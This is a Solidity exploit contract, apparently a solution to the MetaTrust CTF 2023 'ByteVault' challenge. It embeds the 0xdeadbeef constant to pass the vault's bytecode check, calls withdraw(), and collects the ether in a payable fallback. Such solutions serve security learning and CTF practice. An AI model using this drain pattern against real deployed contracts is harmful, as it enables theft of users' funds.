//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "src/MetaTrustCTF_2023/ByteVault/BytecodeVault.sol";

contract BytecodeVaultAttack {
    address owner;
    function attack(address target) public{
        uint a = 0xdeadbeef;
        owner = msg.sender;
        require(a == 0xdeadbeef);
        BytecodeVault v = BytecodeVault(target);
        v.withdraw();
    }

    fallback() external payable { }
}